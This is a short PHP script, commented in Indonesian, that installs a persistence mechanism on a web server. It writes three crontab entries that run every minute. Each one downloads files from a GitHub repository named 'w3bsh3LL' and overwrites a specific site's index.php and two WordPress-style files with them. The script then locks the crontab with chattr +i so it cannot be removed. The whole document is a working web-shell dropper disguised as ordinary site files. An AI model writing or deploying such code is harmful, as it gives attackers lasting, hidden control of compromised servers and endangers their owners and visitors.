<?php
// Daftar URL dan lokasi tujuan
$cronJobs = [
    "* * * * * wget -q https://raw.githubusercontent.com/ceexicp/w3bsh3LL/refs/heads/main/index.php -O /var/www/icontec.massdeveloperstage.com/htdocs/index.php",
    "* * * * * wget -q https://raw.githubusercontent.com/ceexicp/w3bsh3LL/refs/heads/main/rawr.php -O /var/www/icontec.massdeveloperstage.com/htdocs/wp-header.php",
    "* * * * * wget -q https://raw.githubusercontent.com/ceexicp/w3bsh3LL/refs/heads/main/rawr.php -O /var/www/icontec.massdeveloperstage.com/htdocs/wp-sidebar.php"
];

// Menulis setiap cron job ke file sementara
$cronFile = '/tmp/cronfile';
file_put_contents($cronFile, implode(PHP_EOL, $cronJobs) . PHP_EOL);

// Menambahkan cron job ke crontab
exec('crontab ' . $cronFile);

// Mengunci file crontab agar tidak bisa diedit atau dihapus
exec('chattr +i /var/spool/cron/crontabs/' . get_current_user());

// Menghapus file sementara
unlink($cronFile);

echo "Multi-file cron jobs have been added and locked successfully!";
?>
